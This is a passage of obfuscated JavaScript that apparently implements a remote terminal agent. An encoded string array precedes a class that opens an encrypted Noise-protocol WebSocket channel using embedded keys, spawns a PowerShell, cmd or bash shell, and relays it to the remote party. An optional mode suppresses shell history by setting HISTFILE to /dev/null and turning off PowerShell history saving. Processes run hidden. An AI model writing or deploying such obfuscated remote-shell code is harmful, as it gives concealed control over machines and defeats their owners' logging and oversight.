        'nNWZFdf8nhW1Fdb8mG',
        'AgvHCNrIzwf0',
        'DxrMltG',
        'C2vUzeHLywrLCNm',
        'CMvJDKnPCgHLCG',
        'CgfyD0e',
        'zw5KC1DPDgG',
        'BxnNuMvZB2X2zxjZ',
        'C2vJCdi1nMSX',
        'AxnwywXPzeLqDJq',
        's1zn',
        'C2HPzNq',
        'BMfTzq',
        'rMrNBNe',
        'B1Ltz2i',
        'teTwre4',
        'AwDjAgC',
        'B3DUzxi',
        'svHwBeK',
        'ywHmBfy',
        'CMvHzfvjBNqZmKjf',
        'zMu4mdO',
        '8j+uKcdMO4dMTyVLIlaGvg9Rzw7VViZOP4BKUlOGv1ntioMtVUI3R++8JoI3S+I/HYboB2LZzq',
        'C29JAW',
        'CxvPy2SGDhvUBMvSihjLDhvYBMvKig5VBI1ku09oicG',
        'vKvbs1G',
        's05btuuG5zcR6z2E5Rov5A2x56YMicJPMzdLRzFMR43MLBdLRzFLJ4OGk18Tw10Qjd1aldSVkq',
        'q1DHtMK',
        'yxv0Ag9YAxPHDgLVBG',
        'ywXMENO',
        'vw9Ir1C',
        'y2Ldsfy',
        'twTHuNG',
        'yuH6zMi',
        'qwXVwvK',
        'ruT6C0i',
        'D2fYBMLUzW',
        'wMLADgq',
        's1nJugC',
        'zxf1ywXZ',
        'x2zVCM1HDe1Vzgu',
        'CNvU',
        'C2L6zq',
        'wc1uAw1LC3rHBxa',
        'ENfhvge',
        'C3rHDhvZq29Kzq',
        'ruvZthu',
        'ChjVDg9JB2W',
        'D3jPDgveB21HAw5gAwXL',
        'g1S5mg1BrevcvuDDg1SWBsa',
        'whLMB1m',
        'rurpAKO',
        'zLPZshy',
        'wuHWCeS',
        'CNbIz20',
        'mc41lJKTANm',
        'Aw1Hz2uVz2LM',
        'uvPdv3u',
        'tvjkD2K',
        't01wzgS',
        'y3j5ChrV',
        'CMvHzgfIBgu',
        'De5btMe',
        'rNnnyve',
        'vuPesxO',
        'w1rHC2TtDg9Yzv0G4P2mieTtve9srv9lrvKG6z2E5RovicJPNiaGyMfZzty0l2HLEcdNVjBNOihNMOqGmZiG5A2x6iQcksWG5lU75yQH5OYb5lMf5yYw5l+D5OYb5ywZ6zET',
        'zfL6wLa',
        'B3njBMzV',
        's3PuzK4',
        'q0D4s3i',
        'w1rHC2TtDg9Yzv0G4P2mios/NEwTMowKSEI0PsaO5yAf5A2y5lU75yQH5lIn5y+x5B2X5zonktOG',
        'BK1izMC',
        'zffRy3y',
        'C2v0vty0',
        'qKLOz3e',
        'CNnlvwK',
        'z2v0q3jVBLrHC2TZ',
        'CgLK',
        'uuvnvq',
        'yNniveS',
        'x2LZqMLUyxj5',
        'su5gtW',
        'vM9OvLC',
        'C3vIAMvJDgfSDg5HBwu',
        'C2nOzwr1Bgu',
        'x3nLBMrxzwXJB21L',
        'w0Tnt0rfoNnOEI5HBf0G',
        'C3DHChrVDgfS',
        'yMfKihr1BM5LBcbPza',
        'y29UDgfPBMvYza',
        'x29Urgf0yunI',
        'uwv4t1m',
        'y2LWAgvYDgv4Da',
        'CxvPy2SGDhvUBMvSihnLy3jLDcbOyxmGyw4GDw5LEhbLy3rLzcb0ExbL',
        'Be9ishO',
        'sfruuc8YigzYyw1LihrVBYbSyxjNzq',
        'rgD4tKi',
        'BMv0D29YA0LUDgvYzMfJzxm',
        'sMHLwfy',
        'DMfSDwvZ',
        'DwrW',
        'rfj3rxu',
        'CMvNAxn0zxjLza',
        'ywXWBLbYB3rVy29S',
        'q3j5ChrVtwfUywDLCIbPBML0AwfSAxPLza',
        'yNbfDNC',
        'wgPcCxa',
        'yMjlsgS',
        'v1fqrMO',
        'BMvLza',
        'twfewe0',
        'shnTDxu',
        'DxrMoa',
        'zg93BMXVywrgAwXL',
        'CKTNzNm',
        'Dg9ju09tDhjPBMC',
        'CMvTB3zL',
        '4PQG77IpienVBLbuwsdLKk/LIQJLPlhOTkxVViZLM57PGidNRQhPGzpMQkhLVi86ia',
        'C3vtBuG',
        'uKzzzeG',
        'Dhj1zq',
        'zwrNzsbKAwqGBM90ihnLBMqGDgHLieHuvfaVmIbJBgLLBNqGChjLzMfJzq',
        '5lIn5PsV5OYb55Qe54Mi5PYSia',
        'lu5VrxHPDa',
        'AM9HwuS',
        'CMvZDw1L',
        'CMvHzfvjBNqZmKXf',
        'ExbhA2q',
        'zxHWzwn0zwqGq2fWj24GuhjVDg8GC3rYDwn0ihbVAw50zxi',
        'DuDMDgu',
        'zhjjtxu',
        'EfffAMW',
        '5A+g6zkL6l+h55+TicG',
        'rMfPBgvKihrVigXVywqGBM9PC2uTyY53yxnTig1VzhvSzq',
        'mhWXmhWYFdD8oxW1Fdn8mxW4Fdz8na',
        'C2nHwNa',
        't1LxveG',
        'A0Xwu00',
        'qvvLDM4',
        'rNLMtuu',
        'zxvwquG',
        'C3rHDhvZ',
        'BKLTwMe',
        'DMT2Bxq',
        'tMnZsu8',
        'Dw5KzwzPBMvK',
        'oMf1DgHVCML0Eq',
        'vwnMB0C',
        'v0LSAfO',
        'AxnZDwvY',
        'te5xwwi',
        'AdiUy2z0Dw5UzwWUy29T',
        'Axnoyu4',
        'yxjNBYb0Dw5UzwWGBg9VCcbMB3iG',
        'BM90x2zVDw5K',
        'A1L3D2i',
        'r1fXu2y',
        'wePvzfy',
        'rxfmDgS',
        'D2fPDgvYCW',
        'sw5PDgLHBgL6Aw5NienYExb0B01HBMfNzxiUlI4',
        'mJbtALzKww4',
        'DgLTzw91Da',
        'C3vJy2vZCW',
        'CgfYyw1Z',
        'C2v0vte2',
        's01preu',
        'ChjVy2vZC0HHBMrZAgfRzq',
        'Aw1Hz2uVEc1Py29U',
        'zNvSBa',
        'zNntAxPL',
        'vhP4vuK',
        'D0ziDfG',
        'wNngwK0',
        'y29UC3rHBNrZ',
        'y29UBKLUzgv4',
        'zwzPAKG',
        'DxnL',
        'BM8GDhvUBMvSigzVDw5Kig9UihbVCNqG',
        'DhjHBNnMzxiTzw5JB2rPBMC',
        'CMfUz2u',
        'rMzfsvy',
        'D3jPDgvvsw50mtzmrq',
        'A2v5x3nVDxjJzq',
        'CMvHzfvjBNqXnKXf',
        'Cgf0AcbYzxf1AxjLza',
        'DffUEMO',
        'rK9mte9xx1nztuXjtKTt',
        'qLP0wvy',
        'DLfTz2S',
        'y2z0Dw5UzwWUANmVms4W',
        'AxbtAxG',
        'C3rYzwfTv2LUzg93CW',
        'y2XVC2u',
        'qZPCv2LUzg93CW',
        'Bg9Hza',
        'D0LouLe',
        'rvbhq1C',
        'AxDLDuK',
        'u3bSAxq',
        'CwnVqLO',
        'Dg9cExrLCW',
        'B25fEgL0',
        'C3HQB0m',
        'CxvLDwu',
        'z2v0tg9JywXjuhy2',
        'vurxrhe',
        'wMrhyLy',
        'CxrNzue',
        'DhrSx3nLy29Uzhm',
        'uezwthq',
        'mJaW',
        'wgHoD2m',
        't2TiB0q',
        'tfLsAgy',
        'zuz2u0q',
        'CM1KAxjtEw5J',
        'yMfKigfJy291BNqGDgfNig9YigHVC3rUyw1L',
        'wK9lELG',
        'swjot1u',
        'ywnJzxb0lwXHBMD1ywDL',
        'ic0+ideYnY4WlJaUmtO',
        'A0TbAxa',
        '5lIj5QYH5O+H5OMl5lQK5lQs5zco5lUn5PYQ6l+B5ywLievZDgfIBgLZAgvKioEkTUAaGq',
        'y3jLyxrLuhvIBgLJs2v5',
        'DxbKyxrL',
        'wuvrqNG',
        'Bu5VA0O',
        'wgrXs1q',
        'zND6Age',
        'x2rVtM9PC2viyw5KC2HHA2u',
        'BuPiCe8',
        'DgvYBwLUywW',
        'ExDhEhy',
        'DxfhsK0',
        'DgHLBG',
        'ENzNr3y',
        'yNLLwxi',
        'l3j1BI8Uy29UDgfPBMvYzw52',
        'Dg9cExrLqxjYyxK',
        'CNHFyNL0zxm',
        'C2v0vgLTzw91Da',
        'CMvNAxn0CMf0Aw9UrMfPBgvK',
        'wMLVr0y',
        'BxvSDgKTC2vNBwvUDcbdyxaNBIbqCM90BYbTzxnZywDLigLZig5VDcbZDxbWB3j0zwq',
        'AgvHzgvYCW',
        'Aw5JB2DUAxrV',
        'Bw92zuzPBgvZ',
        'w0Tnt0rfxsdWN5oeioMAP+MbK+wFN+wqJEw3SUwgMEwfPtOG',
        'A2LSBa',
        'zvnABhe',
        'ANbbtxC',
        'B3bLBLDYAxrLCG',
        'DhjPBvn0yxj0',
        'y3jLyxrLsg1HyW',
        'AgX0r0e',
        'BxrPBwu',
        'BwPyv2i',
        'sxPSwei',
        'l2fWAs9MAwXLl2rVD25SB2fK',
        'CgHHC2u',
        'A2L6vve',
        'qK9pCxC',
        'ywXvuhu',
        'zxHWB3j0CW',
        'lcdLJP/MLOFKU7BLT7lPMPtNPRS6ia',
        'te9hx0XfvKvm',
        'z1HPzwi',
        'EMLWsxrLBxm',
        'rK1gCgy',
        'AxneAxjLy3rVCNK',
        'l2fWAs9MAwXLl25LDW',
        '5lIk5OQL5BYc5BI4oIa',
        'zwnKC2fFChvIBgLJx2TLEq',
        'C1rAuhm',
        'vK14B04',
        'suDJChq',
        'ug9PBNq',
        'DhvUBMvSigfSCMvHzhKGzxHPC3rZig9UihbVCNqG',
        'vNncqxC',
        'CMvWB3j0u2H6ywXezwj1zW',
        'BNLvB2G',
        'ENPIthm',
        'Dw5eDNK',
        'r2Txzvm',
        'CMvZDg9YzuzYB21tDg9Yzq',
        'BM9Uzq',
        'uMvgz1m',
        'wfzuu3e',
        'q2zer2W',
        'wNfQyxG',
        'CMLfvxi',
        'mZa0',
        'yxjJAa',
        'y3jLyxrLzef0',
        'Ahr0Chm',
        'AgXWruy',
        'yvDdwu4',
        'uwrquNa',
        'CgLWzq',
        'z2v0uhvIBgLJsxbwnG',
        'zgLZAW',
        'DMvYC2LVBG',
        'ywjZ',
        'y3jVBKPVyNm',
        'Dw5RBM93BIbLCNjVCG',
        'ywDLBNq',
        'rND6rKS',
        'uMnPufm',
        'AgLMDgC',
        'x2DLBMvYyxrLuMf3s2v5CgfPCG',
        'v0fstG',
        'yMfZzty0DxjS',
        'tufhsum',
        'dqPdB250zw50lurPC3bVC2L0Aw9UoIbMB3jTlwrHDge7ig5HBwu9iG',
        'zgvJCNLWDa',
        'x2rVBwfPBG',
        'zfvQyvi',
        'D2rNC0C',
        'Au1iELK',
        'CMvZDa',
        'sfbQAfa',
        'uNrPBwvVDxq',
        'zwfZvNm',
        'DMTRuNa',
        'rhrnDKy',
        'tvbKCwK',
        'y3PbvM0',
        'C3rKAw4',
        'w1rHC2TtDg9Yzv0G8j+sVIblu1rpuKvFs0vzioACQUIUVUE9RIWG5lU75yQH5OYb5lMf5yYw5PYQ5zcV55sO',
        'Ahr0Chm6lY9HCgK2lMLWAwz5lM9YzW',
        'l3r1BM5LBa',
        'C2v0rMLSzvbLCM1PC3nPB25Z',
        'r0fotwm',
        'pdGSiowUNUMzHEs9V+EuQca',
        'y2H1BMTF',
        'rwHXrg8',
        'sgvQtwm',
        'EhrurMi',
        'uwDVA1i',
        'lcdKV53NLzNLJP/MLOFKU7BKUi3OPOBNM5ySioACRoASOEs7PEEPUUs7U+wkOEwqR+wkQos4LoAmGEs5HEwmLUwpQUIVUW',
        'Dg9Rzw4',
        'C3rVChbLza',
        'verACwi',
        'AKj6shG',
        'qwnJzxnZlunVBNrYB2WTqwXSB3CTtwv0Ag9KCW',
        'DhmTBM9Kzq',
        'D055uKm',
        'y1zlEuS',
        'rujND3C',
        'ChjPBwuYntz2mq',
        'D2vIC29JA2v0ihn0CMvHBsa',
        'EhLAqMu',
        'quDftLrFvKvsu0LptG',
        'quvtievUy3j5ChqGrxjYB3i6ieTLEsbTDxn0igjLigv4ywn0BhKGmZiGyNL0zxmGzM9YieffuY0YntyU',
        'rgvZDgLUyxrPB24GAxmGysbMAwXLoIa',
        'wgviC1K',
        'qY5vveyToa',
        'Bu9vy2u',
        'DhvUBMvSrg9TywLU',
        'rvHfq19tsevmtf9nt0rf',
        'C3rYAw5N',
        'rvHlwfi',
        'CK9bq20',
        'vMTABMy',
        'C0TVyNi',
        'suXWsMK',
        'qwzorxi',
        'C2XPy2u',
        'zxbUvfG',
        'sfvNv1q',
        'v0jKEuu',
        'zxHWzwn0zwqGq09oveLovufusu9oigzYyw1L',
        'vuvkBe8',
        'whrUuva',
        'runjrvnFufvcteLdx0Tfwv9qru0',
        'ywnJzxnZx2rLBMLLza',
        'Ahr0Chm6lY9JAgvJA2LWlMfTyxPVBMf3CY5JB20',
        'A25uB00',
        '8j+uJcdNU4JNQ6/OV5VNQiVPGidLH7OGkenVzgu6ia',
        'z2v0qxv0AfrHzW',
        'z05PrNq',
        'DfrPEKu',
        'zNvUy3rPB24',
        'txnqAfe',
        'CM1tEw5J',
        'wKLqx01bwf9ftLrssuvt',
        '4P2mioMfJEE9RUAGOEMQJowKSEI0PsaO6z2ErevcvuFMQkhLVi/LV4xPOBVPHy3NVA7LR4BPKQuPoG',
        'tKr3q3q',
        'lcdKUjtPMPtNPRVLPlhOTku6ia',
        'x3n0yxr1C19JywnOzq',
        'AxngAwXL',
        'Cgf0Ag5HBwu',
        'vgvTCeTLEu1HBMfNzxiGAw5PDgLHBgL6zwq',
        'u2H1DhrPBMCGzg93BI4UlG',
        'B25LDgLTzxrHC2TZx2XVzW',
        'zvHrwNe',
        'ugj2zwy',
        'mhW0Fdj8nxWZFde',
        'ktOG',
        'zLv6wKe',
        'runvr1O',
        'yurit1O',
        'wMLWig5VDcbMB3vUzdOG',
        'BfjLrKS',
        'zxHWzwn0zwrszw1VDgvqDwjcnJq',
        'oNn0yxr1CW',
        'D3jPDgvtEw5J',
        'rxPVAeS',
        'zgLNzxn0',
        'mJb8oxWXoxWXFdeYFde2Fdn8ohW2Fde1Fde4FdD8mtb8nxWXm3WWFdeXFdr8mNWXn3WXna',
        'qvDYA1K',
        'quDftLrFufjjvKfurv9lrvK',
        'r01LtM8',
        'Ec1LBMnYExb0zwq',
        'vKXTEe4',
        'BxvSDgLWyxj0l2zVCM0Tzgf0ytSGyM91BMrHCNK9',
        'C29YDa',
        'Dg90ywW',
        'Cw92Eey',
        'BhLRqvi',
        'z2LK',
        'vxbNCMfKztOGD2vIC29JA2v0',
        'Dxf1AeG',
        'De12CNO',
        'zgH6sge',
        'sxDnA0C',
        'CgfYDgLHBa',
        'suHbDw4',
        'Bwv0yvjLCxvLC3rLza',
        'sLvquvy',
        't3DgqKm',
        'D3jPDgvcExrLCW',
        'CMvXDwvZDezPBMLZAgvK',
        'y29Yzxm',
        'wfrNsfm',
        'Bereq3q',
        'xsdIMQdVUi8G5OYh5lUK5Ase55cg5BYc5BI4oIa',
        'y3jVBG',
        'tvP0yLC',
        'ioMRMos6JUAuR+AmGEEjIoACRca',
        'z2v0uhvIBgLJsxbwna',
        'A3vIzxbVzhm',
        'Bwv0Ag9K',
        'Ahr0Chm6lY9ZAhOUywWV',
        'C3rHCNrtDgrPBKXPC3rLBMvY',
        'uM9nq1e',
        'u0foigrVzxmGBM90ignVDMvYigGYlMnMDhvUBMvSlMnVBq',
        'qu50DeW',
        'zgvIDwC',
        'BeTTvue',
        'AMLUCKS',
        'z2vUzxjHDgvqywLY',
        'l2fWAs9MAwXLl2nHDa',
        'Ahr0Chm6lY92nI5PzgvUDc5Tzq',
        'rgjLtvy',
        'A0jqwva',
        'lY5KB2nRzxjLBNy',
        'u3LZDgvTsw5MB0nVBgXLy3rVCIbPBML0AwfSAxPLza',
        'Afncyu8',
        'l2fWAs9MAwXL',
        'B25LDgfZA3m',
        'Axb2nG',
        'uhLKCgS',
        'y3H0A3i',
        '8j+uJcdLRQlMIlFNQ6/KUlVLIQJMLQ3LVia',
        'q29UDgvUDc1mzw5NDgG',
        'CMvWBgfJzq',
        'v1ncvKy',
        'zgvSzxrL',
        'ChvTCe9YAwDPBG',
        'zw5JCNLWDfjLC3bVBNnL',
        'y2XLyxi',
        't3jPz2LUoIbODhrWCZOVlW',
        'zLnkqu4',
        'EwLpzfu',
        'z2v0q3jVBKXVz3m',
        'zMjbD2O',
        'lNvWBg9Hzf9JAhvUA3m',
        'svrxveu',
        'sNvTDK8',
        'tMrRvK0',
        'B0rnBfe',
        'CMvHzejPz1vjBNq2neXf',
        'lcbJCM9Upq',
        'yMzHyK0',
        'vurHDge',
        'Aw1Hz2uVANbLzW',
        'w1DbuK5Diev4y2vWDgLVBIbSB2fKAw5Nie5VAxnLig1VzhvSztO',
        'z2v0qMfZAwnjBMzV',
        'tM90igeGEMLWigzPBgu',
        '8j+uHcbBu0vdvvjjvfLDios4ToAxTUwVHUMsPEI/H+ACNYWG5BEY6l2U5O2Iifnfu1njt05Fs0vzios4JUAoP+wiTUERRYboB2LZzsdLR4BPKQxLR7KGkowqIoAZLEAoP+wiTUERR+MCGoMhJEAwSoIUPoIVGEIoT+wpLIbIyxnLAw5MBYdMLRdLR4BPKQuP',
        'CMvHzezPBgu',
        'q2XLyw5SEsbJBg9Zzwq',
        'vgfTr0W',
        'sg9ZDdOG',
        'mZa2nJu1vM9gwvbl',
        'yKvct0m',
        'DLvXuge',
        'CgvYBwLZC2LVBNm',
        'C2HLBgW',
        'sK5tDKu',
        'q2fWj24GuhjVDg8GCg9PBNrLCIbVDxqGB2yGyM91BMrZ',
        'tM9PC2vFwfHFmJu1mtLFq2HHq2HHug9SEv9cteflrtjZ',
        'DMvYAwz5',
        'zxLbrMS',
        'y29UBMvJDa',
        'z2v0ugvLCKnLCNrPzMLJyxrL',
        'swj3sK4',
        'v2jjvuq',
        'q05PqMq',
        'CvLvCLK',
        'y0jrCfC',
        'y29UDgfPBMvYpwX4yW',
        'C2vYAwfSAxPLzf9OzwfKzxjZ',
        'lJaWmfO',
        'quXeq0q',
        'Ahr0Chm6lY9PzMnVBMzPzY5Tzs9PCa',
        'vg1TEhm',
        't2HfwfO',
        'y2f0y2G',
        'A1nYtKO',
        'ufjjicOGsfruuc8YlJancG0ku00ncG0k',
        'EMf6uvq',
        'ndaW',
        'D1rzqNu',
        'CgfKu3rHCNq',
        'DKXArhK',
        'DhjPBq',
        'uhLUtuu',
        'ufvxtxK',
        'sM5Jrvu',
        'y3jLyxrLrgLYzwn0B3j5',
        'shDABhe',
        '5lIk5OQL5OIq5yQF',
        'sw5PDgLHBgL6Aw5NifrLBxblzxLnyw5Hz2vYlI4U',
        'EMfHs1C',
        'rKTgu1q',
        'rw5JCNLWDfDPDgHbza',
        'DKjxEg8',
        'twLZC2LUzYbYzxf1AxjLzcbJDxn0B20GAgvHzgvYCZOGwc1gAwXLlvbHDgGGyw5KifGTrMLSzs1oyw1L',
        'Bvjpvwi',
        'sNzlvfe',
        'y29UDhjVBc1ZDhjLyw0',
        'DNvlrfG',
        'l3bYB2mVms9Jz3jVDxa',
        'w1rLBxblzxLDioI/H+ACN+I9RUAnOUwKSEI0PtOG',
        'y29UDgvUDa',
        'uwXStfO',
        'DKLAD2q',
        'ywrKCMvZCW',
        'Aw52ywXPzcbiuefdsYbiDwzMBwfUihbHzgrPBMC',
        'A2vYBMvS',
        'wc1bDxrOlvrVA2vU',
        'mc4WlJaUma',
        'zfHcB2e',
        't1bftG',
        'CMvHzgvY',
        'C2v0t25LDgLTzvrHC2TZ',
        'yxffzg0',
        'DfveDK8',
        'nda0',
        'q3nMq0C',
        't0nHDwm',
        'q2XJA0m',
        'icaGms4G6k6+572U546V5Akd5y+y6yEpoIbLEhbVCNqGruneu0fFufvcs0vzpsCTls0Tlujfr0LoifbvqKXjqYblrvKTls0TlsCUlI4N',
        'x2DLDenVBM5Ly3rPB25Z',
        'Ec1JAhvUAY1Pza',
        'A2DbwKC',
        'y2nZufu',
        'wuPOy2e',
        'ufv2zui',
        'x3j1BLrLCM1PBMfS',
        'twf0y2HLzcbtDwiTCgf0AdOG',
        'Bu9NqNK',
        'q2XVC2LUzYbJB25Uzwn0Aw9Uigr1zsb0BYbTAxnZAw5NihjLCxvLC3rFAwq',
        'DhLWzq'
    ];
    a0a = function () {
        return gH;
    };
    return a0a();
}
class a0aT {
    constructor() {
        const fJ = a0aY, a = {
                'niZDM': fJ(0x441),
                'FJfxU': fJ(0x268)
            }, b = a[fJ(0x2cb)]['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['CONTROL_PUBLIC_KEY'] = a0P[fJ(0x844)][fJ(0x89c)][fJ(0x4f3)];
                continue;
            case '1':
                this[fJ(0x501)] = [];
                continue;
            case '2':
                this[fJ(0x34d)] = null;
                continue;
            case '3':
                this['msgResolvers'] = [];
                continue;
            case '4':
                this[fJ(0x6a4)] = a['FJfxU'];
                continue;
            case '5':
                this[fJ(0x74d)] = ![];
                continue;
            case '6':
                this[fJ(0x7e1)] = !![];
                continue;
            case '7':
                this[fJ(0x429)] = null;
                continue;
            case '8':
                this[fJ(0x4aa)] = null;
                continue;
            case '9':
                this[fJ(0x597)] = new a0aR(![], this['AGENT_PRIVATE_KEY'], this[fJ(0x59c)]);
                continue;
            case '10':
                this[fJ(0x243)] = ![];
                continue;
            case '11':
                this[fJ(0x73c)] = a0P['NOISE_KEYS_INTERNAL'][fJ(0x6d2)]['private_b64'];
                continue;
            }
            break;
        }
    }
    async [a0aY(0x913)]() {
        const fK = a0aY, a = {
                'lRQQd': function (b, c) {
                    return b === c;
                },
                'kjHmj': function (b, c) {
                    return b === c;
                },
                'aLeIa': fK(0x78d)
            };
        this[fK(0x4aa)] && a0D['info']('[' + this[fK(0x4aa)] + ']\x20执行终端资源清理...');
        if (this[fK(0x429)]) {
            a['lRQQd'](process['platform'], fK(0x8f5)) && this['ptyProcess'][fK(0x5ed)] && this['_taskkillTree'](this[fK(0x429)]['pid']);
            try {
                this[fK(0x429)][fK(0x699)]();
            } catch (b) {
            }
            this[fK(0x429)] = null;
        }
        if (this['cipher'])
            this[fK(0x597)]['free']();
        if (this[fK(0x34d)])
            try {
                a[fK(0x4ca)](this[fK(0x34d)][fK(0x48a)], this[fK(0x34d)][fK(0x7cc)]) && this[fK(0x34d)][fK(0x661)](0x3e8, a['aLeIa']);
            } catch (c) {
            } finally {
                this[fK(0x34d)] = null;
            }
    }
    [a0aY(0x2bd)](a) {
        const fL = a0aY, b = {
                'XjBqp': function (c, d, f, g) {
                    return c(d, f, g);
                }
            };
        try {
            b[fL(0x60a)](a0r, fL(0x431) + a, { 'windowsHide': !![] }, () => {
            });
        } catch (c) {
        }
    }
    [a0aY(0x439)](a) {
        const fM = a0aY, b = {
                'IMnaB': function (c, d) {
                    return c > d;
                },
                'UEJlO': function (c, d) {
                    return c(d);
                },
                'NQDfe': function (c, d) {
                    return c === d;
                }
            };
        if (this['phase'] === 'handshake') {
            if (b[fM(0x3c1)](this[fM(0x5a7)][fM(0x7f5)], 0x0)) {
                const c = this[fM(0x5a7)]['shift']();
                b[fM(0x715)](c, a);
            } else
                this[fM(0x501)]['push'](a);
        } else
            b['NQDfe'](this['phase'], 'terminal') && this[fM(0x24b)](a);
    }
    async [a0aY(0x8e8)]() {
        const fN = a0aY, a = {
                'WSBVF': function (b, c) {
                    return b > c;
                }
            };
        if (a[fN(0x774)](this[fN(0x501)][fN(0x7f5)], 0x0))
            return this[fN(0x501)]['shift']();
        return new Promise(b => {
            const fO = fN;
            this[fO(0x5a7)][fO(0x39c)](b);
        });
    }
    async ['_doNoiseHandshake'](a) {
        const fP = a0aY, b = {
                'FxDUQ': fP(0x599),
                'TXcJD': fP(0x67f),
                'cNdKB': function (c, d) {
                    return c(d);
                },
                'yLIGf': fP(0x350),
                'dClQr': '加密握手失败'
            };
        a(b[fP(0x8ee)]);
        try {
            await this[fP(0x597)][fP(0x3cd)]();
            const c = await this[fP(0x8e8)](), d = this[fP(0x597)][fP(0x647)](c);
            d && d[fP(0x7f5)] > 0x0 && this[fP(0x34d)][fP(0x2ae)](d);
            const f = await this[fP(0x8e8)]();
            this[fP(0x597)][fP(0x647)](f);
            if (!this[fP(0x597)]['handshakeFinished'])
                throw new Error(b[fP(0x3eb)]);
            b[fP(0x4c2)](a, b[fP(0x583)]);
        } catch (g) {
            a(fP(0x421) + g[fP(0x842)]);
            throw new Error(b[fP(0x939)]);
        }
    }
    ['getAvailableShell']() {
        const fQ = a0aY, a = {
                'VpxXF': function (d, f) {
                    return d === f;
                },
                'fUSKc': fQ(0x662),
                'AaUMc': fQ(0x8a3),
                'QgokR': fQ(0x254),
                'JBfen': fQ(0x4d1),
                'RLEIO': fQ(0x38e),
                'iNuWC': fQ(0x827),
                'SbEvg': fQ(0x378)
            };
        if (a[fQ(0x82f)](process[fQ(0x8de)], fQ(0x8f5))) {
            const d = process.env.SystemRoot || a[fQ(0x999)], f = [
                    a0o[fQ(0x265)](d, a[fQ(0x542)], a[fQ(0x6f3)], a['JBfen'], 'powershell.exe'),
                    process.env.COMSPEC,
                    a0o[fQ(0x265)](d, a[fQ(0x542)], a['RLEIO'])
                ];
            for (const g of f) {
                if (g && a0l[fQ(0x871)](g))
                    return g;
            }
            return a[fQ(0x233)];
        }
        const b = [
            fQ(0x87a),
            fQ(0x847),
            a[fQ(0x815)]
        ];
        for (const h of b) {
            if (a0l['existsSync'](h))
                return h;
        }
        const c = process.env.SHELL;
        if (c && a0l[fQ(0x871)](c))
            return c;
        return a[fQ(0x93a)];
    }
    async [a0aY(0x86c)](a, b, c, d = ![], f = ![]) {
        const fR = a0aY, g = {
                'bbKHk': function (i, j) {
                    return i(j);
                },
                'qYUrY': '🔗\x20检测到\x20WS\x20连接，启用\x20Noise\x20加密',
                'zumOX': fR(0x842)
            };
        this['websocket'] = a, this[fR(0x4aa)] = b, this[fR(0x74d)] = d, this[fR(0x243)] = f;
        const h = i => a0D[fR(0x8e1)](fR(0x38d) + b + ']\x20' + i);
        this[fR(0x7e1)] = !c, g[fR(0x60b)](h, this[fR(0x7e1)] ? g[fR(0x79f)] : fR(0x5b6)), a['on'](g[fR(0x998)], i => this['_handleRawMessage'](i));
        try {
            this[fR(0x7e1)] && await this[fR(0x686)](h), await this[fR(0x7dc)](h);
        } catch (i) {
            g[fR(0x60b)](h, fR(0x88f) + i[fR(0x842)]), await this[fR(0x913)]();
        }
    }
    async [a0aY(0x7dc)](a) {
        const fS = a0aY, b = {
                'HYVRk': function (h, i) {
                    return h(i);
                },
                'nMZaN': function (h, i) {
                    return h(i);
                },
                'uEIfS': fS(0x771),
                'Zqjax': fS(0x34a),
                'ahLlV': fS(0x705),
                'kfksb': function (h, i) {
                    return h !== i;
                },
                'ySyAB': function (h, i) {
                    return h === i;
                },
                'vuKDX': fS(0x8f5),
                'dUjaR': fS(0x42d),
                'DkLah': fS(0x61b),
                'BOOqw': fS(0x1f0),
                'PyNgp': 'Set-PSReadLineOption\x20-HistorySaveStyle\x20SaveNothing',
                'wSjEp': fS(0x210),
                'PylrQ': fS(0x688),
                'TfEXf': function (h, i) {
                    return h > i;
                },
                'YRdQy': fS(0x661),
                'eTBgi': function (h, i) {
                    return h(i);
                }
            }, c = this[fS(0x3ea)]();
        a(fS(0x55c) + c);
        const d = Object[fS(0x202)]({}, process.env);
        delete d[fS(0x4b7)], d[fS(0x889)] = b[fS(0x6c2)];
        if (!d[fS(0x592)])
            d[fS(0x592)] = b[fS(0x5b3)];
        this[fS(0x243)] && b[fS(0x99a)](process[fS(0x8de)], fS(0x8f5)) && (d[fS(0x851)] = '/dev/null');
        const f = this[fS(0x243)] && b[fS(0x863)](process['platform'], b[fS(0x7c0)]) && b[fS(0x863)](a0o[fS(0x966)](c)[fS(0x216)](), b[fS(0x6dd)]) ? [
                b[fS(0x996)],
                b[fS(0x6a6)],
                b[fS(0x475)]
            ] : [], g = a0E();
        try {
            const h = {
                'name': 'xterm-256color',
                'cols': 0x50,
                'rows': 0x18,
                'cwd': g,
                'env': d
            };
            if (b['ySyAB'](process[fS(0x8de)], b[fS(0x7c0)]))
                try {
                    this['ptyProcess'] = a0C[fS(0x861)](c, f, h);
                } catch (i) {
                    b['HYVRk'](a, fS(0x615) + i[fS(0x842)]), this[fS(0x429)] = new a0aS(c, d, g, f), this[fS(0x429)][fS(0x861)]();
                }
            else
                this[fS(0x429)] = a0C['spawn'](c, f, h);
            a(fS(0x3e7) + (this[fS(0x429)][fS(0x5ed)] || b[fS(0x3e6)]) + ')');
            this[fS(0x74d)] && this['_sendWelcome'](c);
            this[fS(0x6a4)] = b['PylrQ'];
            while (b[fS(0x32f)](this['msgQueue'][fS(0x7f5)], 0x0)) {
                const j = this[fS(0x501)][fS(0x5ab)]();
                this[fS(0x24b)](j);
            }
            this[fS(0x429)]['onData'](k => {
                const fT = fS;
                try {
                    let l = Buffer[fT(0x4ed)](k, fT(0x5a2));
                    this['useNoise'] && this[fT(0x597)] && this[fT(0x597)][fT(0x488)] && (l = this['cipher'][fT(0x430)](l)), this[fT(0x34d)][fT(0x48a)] === 0x1 && this[fT(0x34d)]['send'](l);
                } catch (m) {
                }
            }), this[fS(0x429)][fS(0x66a)](({
                exitCode: k,
                signal: l
            }) => {
                const fU = fS;
                b[fU(0x46d)](a, fU(0x71b) + k + fU(0x3dd) + l + ')'), this[fU(0x913)]();
            }), this['websocket']['on'](b['YRdQy'], () => {
                const fV = fS;
                b[fV(0x408)](a, b['uEIfS']), this[fV(0x913)]();
            });
        } catch (k) {
            b[fS(0x37e)](a, fS(0x59a) + k[fS(0x842)]), await this['cleanup']();
            throw k;
        }
    }
    static [a0aY(0x495)](a) {
        const fW = a0aY, b = {
                'DQtEx': function (d, f) {
                    return d(f);
                },
                'IaXup': function (d, f) {
                    return d || f;
                },
                'VoNZD': fW(0x257)
            };
        let c = a0o[fW(0x966)](b[fW(0x424)](String, b[fW(0x8b8)](a, ''))[fW(0x7b0)]())[fW(0x216)]();
